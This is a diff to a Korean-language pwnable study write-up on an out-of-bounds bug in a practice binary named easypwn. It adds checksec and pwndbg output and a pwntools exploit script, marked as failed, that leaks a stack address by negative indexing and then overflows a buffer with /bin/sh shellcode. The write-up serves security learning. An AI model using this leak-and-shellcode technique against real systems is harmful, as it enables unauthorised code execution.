@@ -15,7 +15,7 @@ Out-Of-Bound
 
 ---
 
-# 예시1
+# 예시1(easypwn)
 
 ```c
 #include <stdio.h>
@@ -105,7 +105,26 @@ int main(void){
 
 ## 분석
 
-먼저, 초기화하기 전에 배열의 요소들을 출력할 수 있는데,
+```sh
+┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/easyoob]
+└─$ checksec ./easypwn
+[*] '/home/foo1/Desktop/kknock/pwnable/easyoob/easypwn'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      PIE enabled
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+full relro라 got overwrite같은 공격은 힘들 것 같고
+스택에서 코드 실행이 가능하므로 쉘코드를 넣을 예정임
+특이한 점은 RWX라는게 있는데, 읽기, 쓰기, 실행 권한이 모두 설정된 메모리 세그먼트가 있다는 것을 나타낸다고 함 
+아마 이것도 공격 백터 중 하나일 것 같지만 아직까지는 잘 모르겠음
+
+
+초기화하기 전에 배열의 요소들을 출력할 수 있는데,
 이전에 다른 함수를 호출하였다면 스택을 생성했을 것이고, 해당 스택에서 사용한 데이터가 그대로 남아 있음
 
 ```sh
@@ -237,98 +256,76 @@ index is under 19
 
 먼저 OOB취약점에 대해 생각해보면, 음수 인덱스만 접근할 수 있으므로, `main`쪽 SFP, RET 방향에 있는 데이터는 접근하기 힘듬
 따라서 반대 방향에 쓸만한 정보가 있는지 찾아봐야 함
-GDB로 분석해보면, `0xfff6dd40`에서 메인의 스택프레임이 끝나지만 그 뒤로도 사용되고 버려진 데이터들이 꽤 많다는 걸 확인 할 수 있음
-
+GDB로 분석해보면 사용되고 버려진 데이터들이 꽤 많다는 걸 확인 할 수 있음
 ```sh
-pwndbg> x/100x $esp-0x30
-0xfff6dd10:	0xf7e2a620	0x5659005b	0xfff6dd34	0x00000002
-0xfff6dd20:	0x56590053	0x56591fb4	0xf7c58c69	0x5658f3ce
-0xfff6dd30:	0x5659005b	0xfff6dd44	0xfff6de08	0x5658f3b8
-0xfff6dd40:	0xf7fccba0	0x00000005	0x00000009	0x0000000a
-0xfff6dd50:	0x0000000b	0x0000000c	0x0000000d	0x0000000f
-0xfff6dd60:	0x00000012	0x00000014	0x0000001a	0x0000001c
-0xfff6dd70:	0x00000023	0x0000002e	0x00000036	0x0000003f
-0xfff6dd80:	0x00000042	0x00000046	0x00000046	0x0000004f
-0xfff6dd90:	0x00000054	0x00000054	0x00000000	0xf7fcc000
-0xfff6dda0:	0xf7f93540	0xffffffff	0x5658e034	0xf7f956d0
-0xfff6ddb0:	0xf7fcc608	0x0000000b	0xfff6de1c	0xfff6dfcc
-0xfff6ddc0:	0x00000000	0x00000000	0x01000000	0x0000000b
-0xfff6ddd0:	0xf7f93540	0x00000000	0xf7c184be	0xf7e2a054
-0xfff6dde0:	0xf7f8d4a0	0xf7fa5f90	0xf7c184be	0xf7f8d4a0
-0xfff6ddf0:	0xfff6de30	0xf7f8d66c	0xf7f8db30	0x00000014
-0xfff6de00:	0xfff6de20	0xf7e2a000	0xf7fcc020	0xf7c21519
-0xfff6de10:	0xfff6e30e	0x00000070	0xf7fcc000	0xf7c21519
-0xfff6de20:	0x00000001	0xfff6ded4	0xfff6dedc	0xfff6de40
-0xfff6de30:	0xf7e2a000	0x5658f34c	0x00000001	0xfff6ded4
-0xfff6de40:	0xf7e2a000	0xfff6ded4	0xf7fcbb80	0xf7fcc020
-0xfff6de50:	0x8097f83a	0xe902122a	0x00000000	0x00000000
-0xfff6de60:	0x00000000	0xf7fcbb80	0xf7fcc020	0x9b8e2200
-0xfff6de70:	0xf7fcca40	0xf7c214a6	0xf7e2a000	0xf7c215f3
-0xfff6de80:	0x00000000	0x56591eb8	0xfff6dedc	0xf7fcc020
-0xfff6de90:	0x00000000	0x00000000	0xf7c2156d	0x56591fb4
+pwndbg> telescope $esp-40 50
+00:0000│-0f0 0xffffcf18 —▸ 0xffffcf34 —▸ 0xffffcf44 ◂— 0x4
+01:0004│-0ec 0xffffcf1c ◂— 0x2
+02:0008│-0e8 0xffffcf20 —▸ 0x56557053 ◂— '5: exit'
+03:000c│-0e4 0xffffcf24 —▸ 0x56558fb4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ebc
+04:0010│-0e0 0xffffcf28 —▸ 0xf7c58c69 (__isoc99_scanf+9) ◂— add eax, 0x1d1397
+05:0014│-0dc 0xffffcf2c —▸ 0x565563ce (main+130) ◂— add esp, 0x10
+06:0018│-0d8 0xffffcf30 —▸ 0x5655705b ◂— 0x61006425 /* '%d' */
+07:001c│ ecx 0xffffcf34 —▸ 0xffffcf44 ◂— 0x4
+08:0020│-0d0 0xffffcf38 —▸ 0xffffd008 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
+09:0024│-0cc 0xffffcf3c —▸ 0x565563b8 (main+108) ◂— sub esp, 8
+0a:0028│ esp 0xffffcf40 —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
+0b:002c│-0c4 0xffffcf44 ◂— 0x4
+0c:0030│-0c0 0xffffcf48 —▸ 0xf7fbeb30 —▸ 0xf7c1acc6 ◂— 'GLIBC_PRIVATE'
+0d:0034│-0bc 0xffffcf4c ◂— 0x1
+0e:0038│-0b8 0xffffcf50 ◂— 0x0
+0f:003c│-0b4 0xffffcf54 ◂— 0x1
+10:0040│-0b0 0xffffcf58 —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f
+11:0044│-0ac 0xffffcf5c ◂— 0x1
+12:0048│-0a8 0xffffcf60 ◂— 0xc00000
+13:004c│-0a4 0xffffcf64 ◂— 0x0
+14:0050│-0a0 0xffffcf68 ◂— 0x1
+15:0054│-09c 0xffffcf6c ◂— 0x0
+16:0058│-098 0xffffcf70 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
+17:005c│-094 0xffffcf74 ◂— 0x20 /* ' ' */
+18:0060│-090 0xffffcf78 ◂— 0x0
+...
 ```
 
 ---
 
-이 중에서 `0x5658f3b8`를 살펴보면, 실제 명령어를 확인해보니 main의 실제 주소 값이 들어 있음을 알 수 있음
+이렇게 런타임 중에 메모리에 적재된 데이터들의 위치를 확인하여 5번 매뉴에서 SBO를 할 수 있게 만들어야 함
+여러 번 분석해보니 전체적으로 크게 스택에 있는 데이터가 변하지 않아 0xffffcf34에 해당하는 값을 leak하여 exploit 코드를 작성해 봤음
 
-```sh
-pwndbg> x/i 0x5658f3b8
-   0x5658f3b8 <main+108>:	sub    esp,0x8
+
+# exploit(실패)
+```python
+from pwn import *
+
+p=gdb.debug('./easypwn')
+#p=process('./easypwn')
+libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+e=ELF('./easypwn')
+context.log_level='DEBUG'
+
+shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+
+#stage1 - stack base leak
+p.recvuntil('5: exit')
+p.sendline(b'4')
+p.recvuntil('know\n')
+#p.sendline(b'-3')	#(main+108)
+p.sendline(b'-5')	#esp+0xc
+p.recvuntil('= ')
+stack_shellcode_entry=(int(p.recvline())-4+0x5c)&0xFFFFFFFF	
+
+#stage2
+p.recvuntil('5: exit')
+p.sendline(b'5')
+p.recvuntil('have\n')
+
+payload=b''
+payload+=shellcode
+payload+=b'a'*(0x68-len(payload))
+payload+=p32(stack_shellcode_entry)
+
+p.sendline(payload)
+p.interactive()
 ```
 
-같은 방법으로 잘 찾아보면 scanf의 위치같이 라이브러리의 주소의 대략적인 위치도 알 수 있게 됨
-
-```sh
-pwndbg> x/i 0x5659005b
-   0x5659005b:	and    eax,0x72610064
-pwndbg> x/i 0xf7e2a620
-   0xf7e2a620 <_IO_2_1_stdin_>:	mov    esp,DWORD PTR [eax]
-pwndbg> x/i 0xfff6dd34
-   0xfff6dd34:	inc    esp
-pwndbg> x/i 0xf7c58c69
-   0xf7c58c69 <__isoc99_scanf+9>:	add    eax,0x1d1397
-pwndbg>
-```
-
----
-
-이렇게 런타임 중에 메모리에 적재된 데이터들의 위치를 확인하여 5번 매뉴에서 SBO를 할 수 있게 됨
-
-```sh
-0x0000148f <+323>:	cmp    eax,0x4
-0x00001492 <+326>:	jne    0x1518 <main+460>
-0x00001498 <+332>:	sub    esp,0xc
-0x0000149b <+335>:	lea    eax,[ebx-0x1f48]
-0x000014a1 <+341>:	push   eax
-0x000014a2 <+342>:	call   0x1080 <puts@plt>
-0x000014a7 <+347>:	add    esp,0x10
-0x000014aa <+350>:	sub    esp,0x8
-0x000014ad <+353>:	lea    eax,[ebp-0xc4]
-0x000014b3 <+359>:	push   eax
-0x000014b4 <+360>:	lea    eax,[ebx-0x1f59]
-0x000014ba <+366>:	push   eax
-0x000014bb <+367>:	call   0x10c0 <__isoc99_scanf@plt>
-0x000014c0 <+372>:	add    esp,0x10
-0x000014c3 <+375>:	mov    eax,DWORD PTR [ebp-0xc4]
-0x000014c9 <+381>:	cmp    eax,0x13
-0x000014cc <+384>:	jg     0x14f7 <main+427>
-0x000014ce <+386>:	mov    eax,DWORD PTR [ebp-0xc4]
-0x000014d4 <+392>:	mov    edx,DWORD PTR [ebp+eax*4-0xc0]
-0x000014db <+399>:	mov    eax,DWORD PTR [ebp-0xc4]
-0x000014e1 <+405>:	sub    esp,0x4
-0x000014e4 <+408>:	push   edx
-0x000014e5 <+409>:	push   eax
-0x000014e6 <+410>:	lea    eax,[ebx-0x1f56]
-0x000014ec <+416>:	push   eax
-0x000014ed <+417>:	call   0x1060 <printf@plt>
-0x000014f2 <+422>:	add    esp,0x10
-0x000014f5 <+425>:	jmp    0x1509 <main+445>
-0x000014f7 <+427>:	sub    esp,0xc
-0x000014fa <+430>:	lea    eax,[ebx-0x1f27]
-0x00001500 <+436>:	push   eax
-0x00001501 <+437>:	call   0x1080 <puts@plt>
-0x00001506 <+442>:	add    esp,0x10
-0x00001509 <+445>:	mov    DWORD PTR [ebp-0xc4],0x4
-0x00001513 <+455>:	jmp    0x13b3 <main+103>
-```
+~~기존에 알고있던 x86 아키택쳐의 에필로그와는 사뭇 달랐음 조금 더 분석을 해봐야 할 듯..~~
